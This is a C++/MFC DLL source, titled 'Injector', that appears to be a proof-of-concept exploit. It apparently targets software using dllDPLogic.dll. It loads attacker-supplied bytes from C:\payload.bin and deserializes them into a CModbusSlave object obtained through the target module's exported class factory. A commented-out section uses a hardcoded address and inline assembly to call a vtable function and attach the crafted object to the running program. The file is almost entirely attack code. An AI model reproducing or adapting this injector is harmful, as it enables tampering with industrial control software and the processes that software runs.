#include <afx.h>
#include <afxwin.h>
#include <vector>

typedef CRuntimeClass* (__stdcall* PGET_CLASS)();

void ShowError(LPCTSTR msg) {
    ::MessageBox(NULL, msg, _T("Injector"), MB_OK | MB_ICONERROR);
}

extern "C" __declspec(dllexport) void RunPoc()
{
    AFX_MANAGE_STATE(AfxGetStaticModuleState());

    const TCHAR* kPayloadPath = _T("C:\\payload.bin");
    CFile file;
    if (!file.Open(kPayloadPath, CFile::modeRead | CFile::typeBinary)) {
        ShowError(_T("Failed to open C:\\payload.bin"));
        return;
    }

    ULONGLONG size = file.GetLength();
    std::vector<BYTE> buffer((size_t)size);
    file.Read(buffer.data(), (UINT)size);
    file.Close();

    CMemFile memFile(buffer.data(), (UINT)size);
    CArchive ar(&memFile, CArchive::load);

    HMODULE module = ::GetModuleHandle(_T("dllDPLogic.dll"));
    if (!module) {
        ShowError(_T("dllDPLogic.dll not loaded"));
        return;
    }

    FARPROC proc = ::GetProcAddress(module, "?GetThisClass@CModbusSlave@@SGPAUCRuntimeClass@@XZ");
    if (!proc) { ShowError(_T("Factory not found")); return; }

    PGET_CLASS getClass = reinterpret_cast<PGET_CLASS>(proc);
    CRuntimeClass* runtimeClass = getClass();
    CObject* obj = runtimeClass->CreateObject();

    if (!obj) { ShowError(_T("CreateObject failed")); return; }

    // 1. 反序列化验证
    try {
        obj->Serialize(ar);
        ::MessageBox(NULL, _T("✅ Serialize OK! Payload is Valid."), _T("Success"), MB_OK);
    } catch (CException* e) {
        e->Delete();
        ShowError(_T("Serialize Failed"));
        return;
    }

    // 2. 挂载逻辑 (暂时屏蔽)
    /*
    void* pManager = *(void**)0x0084713C;
    if (pManager) {
        try {
            DWORD* vtable = *(DWORD**)pManager;
            void* pAddFunc = (void*)vtable[34];
            __asm {
                push 1
                push obj
                mov ecx, pManager
                call pAddFunc
            }
            ::MessageBox(NULL, _T("Attached!"), _T("Done"), MB_OK);
        } catch (...) {}
    }
    */

    // 暂不 delete obj，避免析构潜在崩溃
    ar.Close();
    memFile.Close();
}
